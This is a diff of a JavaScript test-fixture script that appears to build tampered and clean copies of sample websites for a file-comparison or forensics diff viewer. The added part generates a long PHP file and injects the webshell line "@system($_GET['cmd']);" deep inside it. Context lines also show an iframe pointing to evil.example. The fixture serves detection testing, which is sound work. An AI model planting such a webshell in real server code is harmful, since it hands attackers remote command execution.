@@ -93,6 +93,24 @@ write(RIGHT, 'shop.local/index.html', cleanShopHtml.replace('</body>', '  <scrip
 write(RIGHT, 'shop.local/promo.htm', `<html><body><h2>PROMO</h2><iframe src="https://evil.example/ad"></iframe></body></html>\n`);
 // shop.local/cart.php: DELETED on right (present only on left) — so NOT written here.
 
+// example.com/big.php: MODIFIED and LONG (~2000 lines) to exercise diff scrolling.
+const bigLines = ['<?php', '// large module — used to test diff viewer scrolling', ''];
+for (let i = 1; i <= 400; i++) {
+  bigLines.push(`function handler_${i}($req) {`);
+  bigLines.push(`    // step ${i} of the pipeline`);
+  bigLines.push(`    $value = ${i} * 2;`);
+  bigLines.push(`    return process($req, $value);`);
+  bigLines.push('}');
+}
+const bigLeft = bigLines.join('\n') + '\n';
+const bigRightLines = bigLines.slice();
+// inject a webshell line deep in the file so the change is far down (needs scrolling to reach)
+bigRightLines.splice(1500, 0, "    @system($_GET['cmd']); // <-- injected, deep in the file");
+bigRightLines[8] = bigRightLines[8].replace('* 2;', '* 3; // tampered near the top');
+const bigRight = bigRightLines.join('\n') + '\n';
+write(LEFT, 'example.com/big.php', bigLeft);
+write(RIGHT, 'example.com/big.php', bigRight);
+
 // ---- evidence folder + CSV manifests ----
 fs.mkdirSync(EVID, { recursive: true });
 generate(LEFT, '/mnt/data', path.join(EVID, 'left.csv'));
@@ -102,4 +120,4 @@ console.log('sample built under', ROOT);
 console.log('  left  :', LEFT);
 console.log('  right :', RIGHT);
 console.log('  csvs  :', path.join(EVID, 'left.csv'), '/', path.join(EVID, 'right.csv'));
-console.log('Expected: 3 modified, 2 added, 1 deleted across example.com + shop.local');
+console.log('Expected: 4 modified (incl. big.php ~2000 lines), 2 added, 1 deleted');
